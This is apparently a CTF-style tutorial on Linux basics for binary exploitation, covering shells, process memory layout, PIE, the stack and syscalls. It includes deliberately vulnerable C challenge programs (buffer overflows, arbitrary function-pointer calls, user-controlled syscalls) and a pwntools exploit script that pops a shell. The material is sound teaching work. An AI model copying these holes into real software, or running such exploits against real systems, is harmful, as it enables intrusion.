# Introduction to Linux Basics for Pwn

## What is a Shell?

A shell in linux is an interactive program that allows users to execute commands (i.e. programs) through a command-line interface (CLI).  
When you open a terminal in Linux, you're essentially working with a shell.  
Common Shells in Linux:
* **Bash**: The default shell in most Linux distributions.
* **Zsh**: Another popular shell, often used for its customization features.
* **Sh**: The original Bourne Shell.

## Basic Linux Commands

When you interact with a Linux system, you will need to use various commands to manage files, processes, and the system itself. Below are some of the most basic commands you'll need for pwn development:

File Navigation:
+ `ls`: Lists files and directories.
+ `cd`: Changes the current directory.
+ `pwd`: Prints the current working directory.

File Operations:
+ `cat`: Displays the contents of a file.
+ `touch`: Creates an empty file.
+ `nano`: Opens a simple text editor for creating and editing files.
+ `rm`: Removes a file.

Network Commands:
+ `nc`: a versatile networking tool used for reading/writing data across network connections.

Example:
```bash
user@linux:~$ pwd
/home/user

user@linux:~$ ls
Documents  Downloads  Pictures  Music  Desktop

user@linux:~$ cd Documents

user@linux:~/Documents$ pwd
/home/user/Documents

user@linux:~/Documents$ ls
flag.txt  folder1  folder2

user@linux:~/Documents$ cat flag.txt
FL1TZ{this_is_a_dummy_flag}

user@linux:~/Documents$ cd ..

user@linux:~$ pwd
/home/user

user@linux:~$ nc time.nist.gov 13
60770 25-04-05 09:58:41 50 0 0 654.4 UTC(NIST) *
```

## Executing a Shell Using C/C++

In pwn, one common task is executing a shell on a target machine after exploiting a vulnerability. This can be done by spawning a shell through a C/C++ program. Here's how you can do it:

+ The `system()` function in C/C++ allows you to execute shell commands directly from within a C/C++ program.
Syntax:
```C
#include <stdlib.h>

int system(const char *command);
```
The command parameter is the shell command you want to execute.  
If the command is successful, system() returns the command's exit status.

Example:
```C
#include <stdlib.h>

int main() {
    system("/bin/sh");
    return 0;
}
```
This program will spawn a /bin/sh shell when executed.

+ Another method is to use `execve()`, which allows more control over the environment of the new process. It’s commonly used for shellcode in exploits.
Syntax:
```C
#include <unistd.h>

int execve(const char *path, char *const argv[], char *const envp[]);
```
+ `path`: The path of the program to execute (e.g., `/bin/sh`).
+ `argv[]`: Arguments for the program (e.g., argv[0] can be the name of the program).
+ `envp[]`: The environment variables (can be NULL for default environment).

Example:
```C
#include <unistd.h>

int main() {
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
    return 0;
}
```
In this example, `execve()` executes `/bin/sh`, effectively launching a shell.

![Static Badge](https://img.shields.io/badge/Get_The-flag.txt-Green?style=flat-square&color=5555ff) 
+ `nc x-0r.com 1337`
this service provides an interactive Bash Shell
+ `nc x-0r.com 1338`
this service provides an interactive Bash Shell
+ `nc x-0r.com 1339`
this service runs the `MyProgram` program  
```C
// MyProgram.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char username[100];
    char password[100];

    printf("Enter username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    printf("Enter password: ");
    fgets(password, sizeof(password), stdin);
    password[strcspn(password, "\n")] = 0;

    if (strcmp(username, "fl1tz") == 0 && strcmp(password, "securinets") == 0) {
        printf("Access granted. Starting shell...\n");
        system("/bin/bash");
    } else {
        printf("Invalid username or password.\n");
    }

    return 0;
}
```

# Understanding Programs and Processes

> [!Important]
> I will be discussing programs in the context of compiled binaries (specifically ELF files)  

## Programs vs. Processes

A **program** is an executable file that contains:
+ Machine code instructions (for the CPU to execute).
+ Data (constants, initialized variables, etc.).
+ Metadata (debug info, symbols, entry point).
+ Resources (icons, images, configuration files, etc.).
+ Dependencies/Libraries (statically or dynamically linked).

A **process** is an instance of a program that is currently being executed by the operating system, you can think of it as a living program.  
Key Components of a Process:  
+ Code (Instructions):  
    This is the actual program code that is executed by the CPU, similar to the machine code instructions from the program's executable file. In the process, this is usually loaded into memory (often in a read-only section to prevent modifications).

+ CPU Execution Context:  
    Registers: These are small, fast storage locations in the CPU that hold data needed for processing (e.g., instruction pointers, general-purpose registers).
    Status flags and control registers: These manage execution states such as interrupts, CPU mode, etc.

+ Memory:  
    Heap: Dynamic memory allocated during the process's execution, typically used for variables that need to persist and grow in size (e.g., arrays, objects).
    Stack: Memory used for function calls, local variables, and control flow (e.g., return addresses, function arguments).
    Data segments: Where global and static variables reside, usually split into initialized (.data) and uninitialized (.bss) sections.
    Memory Mappings: The memory layout may also include memory-mapped files or libraries (shared objects or DLLs).

+ Process Control Block (PCB):
    This is an internal data structure used by the operating system to manage and track process information. It holds essential information like the process ID (PID), state (running, waiting, etc.), CPU registers, and memory management data.

+ File Descriptors:
    These are references to open files, sockets, or other I/O resources. For instance, the process might have open file handles to read/write to files, access network sockets, or interact with other devices.
    File descriptors are typically stored in a file descriptor table within the process.

+ Execution State:  
    The current state of the process, such as whether it is running, ready, waiting, or terminated. The process can transition between these states as it executes.

+ System Resources:
    I/O Buffers: The process might maintain buffers for data being read or written, especially for tasks like file handling or networking.
    Network Connections: Sockets and network-related state can also be part of the process's resources.

+ Signal Handling:
    A process may have signals (such as interrupts, alarms, etc.) that it handles. The process maintains a signal handling mechanism in its context, where it decides what actions to take in response to external signals (e.g., terminating, pausing execution).


Example:  
Let's say you want to print 'Hello world!' on your terminal's screen, so you decide to write this simple C program:  
```C
#include <stdio.h>

int main() {
    printf("%s\n", "Hello World!");
    return 0;
}
```
To compile it, you use `gcc hello.c -o hello`, which creates an executable file named `hello`.  
Running `./hello` then starts a process that loads and executes the program, printing `Hello World!` to the terminal.  
In this case, the **program** is the compiled `hello` binary, and the **process** is the running instance of that program.

## The Layout of a Process in Memory
When a process is loaded into memory, it is divided into several key regions. Let’s look at the most important parts of this layout:  
+ Text Section (.text):  
    This is where the program’s executable code resides. It is read-only (Hopefully?), meaning it can’t be modified during execution (this is a security measure). When a process is loaded into memory, the operating system places the compiled machine code here.  
    Example: x++; would be stored in this section (as machine code)

+ Data Section (.data):  
    This section holds initialized global variables or static variables. When you declare a variable in a program and assign it a value, this value is stored in the data section.  
    Example: `int x = 5; /* in global scope */` would be stored in this section.

+ BSS Section (.bss):  
    This section is for uninitialized global variables. If you declare a global variable but don’t initialize it, the operating system ensures it is zeroed out in memory when the program starts.  
    Example: `int y; /* in global scope */` would be stored here and initialized to zero at runtime.

+ Heap:  
    The heap is used for dynamic memory allocation. When you use functions like malloc() in C, the memory is allocated on the heap. The heap grows upwards from lower memory addresses as more memory is allocated during execution.  
    Example: `int *arr = malloc(100 * sizeof(int));` will allocate memory on the heap for 100 integers.

+ Stack:  
    The stack is used for function call management and local variable storage. It grows downwards in memory. Each time a function is called, a stack frame is created containing local variables and the return address (so the program knows where to resume execution after the function finishes).  
    Example:
    ```C
    int main(void) {
            int a = 0x1337;
    }
    ```
    here `a` is a local variable so it will be stored on the stack.

+ Memory-Mapped Region:  
    This area is used for dynamically loaded libraries (shared libraries) and other system resources. The operating system might map files or device drivers into this region as well.

![MemoryLayout](Resources/LinuxProcessMemoryLayout.png)

> [!IMPORTANT]
> **nm** (part of the GNU Binutils package): lists symbols—including functions, variables, and their memory addresses—in executable files, object files, and libraries.  
> Debian/Ubuntu (Including WSL): sudo apt update && sudo apt install binutils -y  
> Arch Linux: sudo pacman -Syu binutils --noconfirm  
> Verify Installation: nm --version  # Should show GNU Binutils version

![Static Badge](https://img.shields.io/badge/Apply-Material-Green?style=flat-square&color=5555ff)  
+ `nc x-0r.com 1340`
+ `nc -vn x-0r.com 1341 > MyProgram`  

make `MyProgram` executable with `chmod +x ./MyProgram`
```C 
#include <stdio.h>
#include <unistd.h>

void secret_win() {
    printf("Shell popped!\n");
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}

int main() {
    void (*func_ptr)();
    unsigned long address;

    printf("Enter the address of the function you want to call (in hex): ");
    scanf("%lx", &address);

    func_ptr = (void (*)())address;
    printf("Calling function at address %p...\n", func_ptr);
    func_ptr();

    return 0;
}
```

> [!IMPORTANT]
> **pwn checksec** (part of the Pwntools framework): analyzes binary security protections including PIE, NX, RELRO, Stack Canaries, and more. Essential for exploit development and binary analysis.  
> Install checksec via Pwntools: pip install pwntools  
> Verify Installation: pwn checksec --help

```Bash
pwn checksec ./MyProgram
```
Output:
```Bash
[*] '/path/to/MyProgram'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
We notice that PIE (Position-Independent Executable) is disabled (No PIE): The binary loads at a fixed base address in memory.

What is PIE?
+ PIE (Position-Independent Executable) randomizes the base address of the binary when loaded into memory.
+ Without PIE, addresses seen in nm or objdump are absolute (e.g., secret_win is always at 0x401166).
+ With PIE, addresses are offsets—you must add the runtime base address to get the actual location.

![Static Badge](https://img.shields.io/badge/Apply-Material-Green?style=flat-square&color=5555ff)  
+ `nc -vn x-0r.com 1342 > MyProgramWithPIE`  
```C
#include <stdio.h>
#include <unistd.h>

void secret_win() {
    printf("Shell popped!\n");
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}

int main() {
    void (*func_ptr)();
    unsigned long address;
    unsigned long base_address;

    FILE *maps = fopen("/proc/self/maps", "r");
    if (maps == NULL) {
        perror("fopen");
        return 1;
    }

    fscanf(maps, "%lx", &base_address);
    fclose(maps);

    printf("Base address of binary: %lx\n", base_address);
    printf("Enter the address of the function you want to call (in hex): ");
    scanf("%lx", &address);

    func_ptr = (void (*)())address;
    printf("Calling function at address %p...\n", func_ptr);
    func_ptr();

    return 0;
}
```

Key Takeaway
+ No PIE = Predictable addresses (easier for exploits).
+ PIE Enabled = Addresses are randomized (base + offset).
+ Use pwn checksec to quickly audit binary protections.

For exploit development:
+ If PIE is disabled, hardcode addresses (e.g., secret_win@0x401152).
+ If PIE is enabled, leak the base address first, then calculate base + offset.

### Pwntools
Pwntools is a powerful Python library designed for exploit development, making it easier to interact with binaries, craft payloads, and automate exploits. It provides:
+ Process Interaction (process, remote) – Run binaries locally or connect to remote services.
+ Packing/Unpacking (p32, p64, u32, u64) – Convert between integers and bytes (endianness-aware).
+ Debugging (gdb.attach) – Attach GDB to running processes.
+ Shellcraft – Generate shellcode for multiple architectures.
+ ...(a lot more)

**Using Pwntools for the PIE Challenge**  
Key Steps
+ Leak the Base Address
+ Calculate secret_win Address
+ Send Payload

```python
from pwn import *

elf = context.binary = ELF('./MyProgramWithPIE')  # Parses the binary
offset_secret_win = elf.symbols['secret_win']     # Get offset of secret_win

def exploit():
    p = process('./MyProgramWithPIE')  # Local

    p.recvuntil(b'Base address of binary: ') 
    base_address = int(p.recvline().strip(), 16)
    log.success(f"Base address: {hex(base_address)}")

    secret_win_addr = base_address + offset_secret_win
    log.info(f"secret_win @ {hex(secret_win_addr)}")

    p.sendline(hex(secret_win_addr).encode())

    p.interactive()

if __name__ == '__main__':
    exploit()
```

Explanation
+ ELF() – Parses the binary to extract symbols (e.g., secret_win offset).
+ process() – Spawns the target locally.
+ recvuntil() + recvline() – Extracts the leaked base address.
+ sendline() – Sends the calculated address of secret_win.
+ interactive() – Drops into an interactive shell post-exploit.

![Static Badge](https://img.shields.io/badge/Apply-Material-Green?style=flat-square&color=5555ff)  
+ `nc x-0r.com 1343`  
```C
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <signal.h>

void alarm_handler(int sig) {
    printf("\nToo slow!\n");
    exit(1);
}

int main() {
    srand(time(0));
    
    int a = rand() % 100000 + 1;
    int b = rand() % 100000 + 1;
    int c = rand() % 100000 + 1;
    int sum = a + b + c;
    
    signal(SIGALRM, alarm_handler);
    alarm(1);
    
    printf("You have 1 second to solve this:\n");
    printf("%d + %d + %d = ?\n", a, b, c);
    
    int answer;
    scanf("%d", &answer);
    
    alarm(0);
    
    if (answer == sum) {
        printf("Correct! Here's your shell:\n");
        system("/bin/sh");
    } else {
        printf("Wrong answer!\n");
    }
    
    return 0;
}
```
## The Stack
The stack in processes is a region of memory used for storing temporary data, such as function call information, local variables, and control flow information. It works on a last-in, first-out (LIFO) principle, meaning that the last data pushed onto the stack is the first to be popped off. Here's a detailed explanation of how the stack works, particularly in the context of function calls, local variables, and how it grows:

1. How the Stack Grows  
The stack grows downward, meaning that the address of the stack pointer decreases as new data is pushed onto the stack. In most systems, the stack starts at a high memory address and grows towards lower addresses as function calls and local variables are added. When a new function is called, the system allocates space for it on the stack.

2. How Local Variables Get Added  
Each time a function is called, the system allocates space on the stack to hold:  
     - The return address (the point where the program should continue after the function finishes).
     - The function's local variables (variables declared inside the function).
     - Other function-related information, such as saved registers or parameters.    

This area of memory is often referred to as the stack frame. The size of the stack frame is determined by how many local variables and parameters the function uses.

3. Function Calls and Stack Frames  
The base pointer (often referred to as BP/FP or ebp/ebp in x86 architectures) points to the base of the current stack frame. Local variables are typically located at offsets from the base pointer.  
The stack pointer (often referred to as SP or esp/rsp in x86 architectures) points to the current top of the stack.

When a function is called, the following steps typically occur:
+ The return address (where to resume after the function ends) is pushed onto the stack.
+ The stack frame for the new function is created, including space for local variables and possibly parameters.
+ The function’s local variables are created in this new stack frame.

Consider this example of a function call:
```C
void functionA() {
    int x = 10;
    functionB();
}

void functionB() {
    int y = 20;
}
```
Stack Layout:

When functionA() is called:
+ The return address to the instruction after functionA() is pushed.
+ The stack frame for functionA() is created, which includes space for the local variable x.

When functionB() is called from functionA():
+ The return address to functionA() is pushed onto the stack.
+ The stack frame for functionB() is created, which includes space for the local variable y.

After functionB() finishes, it returns to functionA(), and the stack frame for functionB() is popped off.

4. How Local Variables Are Accessed  
Local variables are accessed by their position relative to the base pointer (or frame pointer).  
Variables declared within a function are pushed onto the stack when the function is called and can be accessed through the base pointer.  
They are accessed by calculating the offset from the current stack frame.

Example:
```C
0x0 #include <stdio.h>
0x1
0x2 void functionB() {
0x3     printf("Hello from functionB!\n");
0x4 }
0x5
0x6 void functionA() {
0x7     printf("Hello from functionA! Calling functionB...\n");
0x8     functionB();
0x9     printf("We returned to funcationA!")
0xa }
0xb
0xc int main() {
0xd     functionA();
0xe     printf("We returned to main!")
0xf     return 0;
0x10 }
```
![MemoryLayout](Resources/StackLayout.png)

![Static Badge](https://img.shields.io/badge/Apply-Material-Green?style=flat-square&color=5555ff)  
+ `nc x-0r.com 1344`
```C
int main() {
    char privileges[20] = "no privileges";
    char username[10];
    
    printf("Enter your username: ");
    scanf("%s", username);
    
    if (strcmp(privileges, "no privileges") == 0) {
        printf("Welcome %s\n", username);
    } else {
        printf("Welcome admin\n");
        system("/bin/sh");
    }
    
    return 0;
}
```
+ `nc x-0r.com 1345`
```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void handle_segfault(int sig) {
    printf("Segmentation fault detected! Opening shell...\n");
    system("/bin/sh");
    exit(1);
}

int main() {
    signal(SIGSEGV, handle_segfault);
    
    char buffer[10];
    
    printf("What do you want to say?: ");
    scanf("%s", buffer);
    
    printf("You entered: %s\n", buffer);
    
    return 0;
}
```
`nc x-0r.com 1346`
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("Spawning shell...\n");
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}

void vuln() {
    char buffer[5];
    printf("What do you have to say?:");
    gets(buffer);
}

int main() {
    vuln();
    printf("Goodbye!\n");
    return 0;
}
```

# System Calls and Context Switching

Ever wondered how your program interacts with the system to open a file, allocate memory, or get input from the keyboard? This is done through system calls. A system call is a request made by a process to the operating system to perform an action that it cannot perform directly, such as interacting with hardware or accessing protected resources.

When you want to open a file, for instance, your program cannot just read or write to arbitrary memory locations that correspond to files. It needs to ask the kernel for permission. This is where system calls come into play.

### System Calls
Let’s break it down with an example: You call open() in C/C++ to open a file. Behind the scenes, the following happens:
+ The user space (your program) calls the open() function.
+ The operating system traps this call via a software interrupt and switches to kernel mode.
+ The kernel checks whether the program has the necessary permissions to open the file, and if so, it opens the file and returns a file descriptor to the user space.
+ Your program can then use the file descriptor to read from or write to the file.

This process of switching between user space and kernel space is known as a context switch. Context switching happens whenever the CPU switches between different tasks (or processes) and must save the state of the current task and restore the state of the new task.

![MemoryLayout](Resources/PrivilegeRing.png)

### Context Switching

A context switch is a fundamental mechanism in multitasking operating systems. When the CPU switches from running one process to another, the operating system needs to save the state of the current process and restore the state of the next process. This is done to ensure that each process appears to run independently and gets a fair share of CPU time.

But what does “save the state” mean?  
The state includes the registers, the program counter (PC), the stack pointer, and other context information. Essentially, the operating system saves everything that’s needed to resume the process later.

For example, imagine a program is executing and gets interrupted to give another process CPU time. The kernel will save the current process’s registers (which include the program counter, stack pointer, etc.) and restore the state of the next process, allowing it to continue execution seamlessly.

### Introduction to Registers

Now that we’ve covered processes, system calls, and context switching, it’s time to introduce registers — an essential part of the CPU.

Registers are small, very fast storage locations within the CPU. They hold data that the CPU needs to operate quickly, such as instructions, addresses, and intermediate results. Every process has its own set of registers that are saved and restored during context switching.

When the operating system performs a context switch, it doesn't save everything in the process’s memory. Instead, it saves the registers — essentially the most critical information required to resume execution.
Key Registers in x86/x86-64 Architecture:
+ EAX/RAX (Accumulator Register): This register is used for arithmetic operations and storing function return values.
+ EBX/RBX (Base Register): Used for data manipulation, and it often stores the base address for certain operations.
+ ECX/RCX (Count Register): Often used as a loop counter or for passing the third argument to functions.
+ EDX/RDX (Data Register): Used for a variety of tasks, including I/O operations and function return values.
+ ESI/RSI and EDI/RDI (Source and Destination Index): Used for string and memory operations.
+ ESP/RSP (Stack Pointer): Points to the current top of the stack. The stack pointer changes every time a function is called or returns.
+ EBP/RBP (Base Pointer): Points to the base of the current stack frame and is used to access function arguments and local variables.

Each of these registers plays an important role in function calls, data manipulation, and process state management. Understanding these registers is essential when dealing with low-level exploits and understanding how processes work.

![Static Badge](https://img.shields.io/badge/Apply-Material-Green?style=flat-square&color=5555ff)  
+ `nc x-0r.com 1347`
```C
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>

int main() {
    long number, arg2, arg3;
    char arg1[10];    

    printf("=== Syscall Practice ===\n");
    printf("Enter syscall number: ");
    scanf("%ld", &number);
    
    printf("Enter argument 1: ");
    scanf("%s", &arg1);
    printf("Enter argument 2: ");
    scanf("%ld", &arg2);
    printf("Enter argument 3: ");
    scanf("%ld", &arg3);    
    long result = syscall(number, arg1, arg2, arg3);
    
    printf("\nSyscall returned: %ld\n", result);
    return 0;
}
```
+ `nc x-0r.com 1348`
```C
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>

int main() {
    char buf[30];

    int flag_fd = open("flag.txt", O_RDONLY);
    if (flag_fd < 0) {
        perror("Failed to open flag.txt");
        return 1;
    }

    printf("Welcome to Syscall Math!\n");
    printf("I've opened flag.txt on fd %d\n", flag_fd);
    
    long num1, num2, num3, num4;
    printf("first syscall number: ");
    scanf("%ld", &num1);
    printf("agr0 for first syscall: ");
    scanf("%ld", &num2);
    printf("second syscall number: ");
    scanf("%ld", &num3);
    printf("arg0 for second syscall: ");
    scanf("%ld", &num4);
    syscall(num1, num2, buf, 30);
    syscall(num3, num4, buf, 30);

    close(flag_fd);
    return 0;
}
```







